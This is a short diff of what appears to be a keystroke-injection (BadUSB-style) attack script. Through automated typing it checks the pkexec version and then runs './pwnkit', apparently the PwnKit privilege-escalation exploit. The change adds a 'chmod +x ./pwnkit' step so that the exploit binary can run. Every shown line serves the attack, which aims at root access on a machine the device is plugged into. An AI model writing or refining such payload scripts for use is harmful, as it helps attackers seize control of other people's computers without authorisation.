@@ -90,6 +90,10 @@ Q STRING "/usr/bin/pkexec --version"
 Q ENTER
 Q DELAY 1500
 
+Q STRING "chmod +x ./pwnkit"
+Q ENTER
+Q DELAY 1500
+
 Q STRING "./pwnkit"
 Q ENTER
 Q DELAY 1500
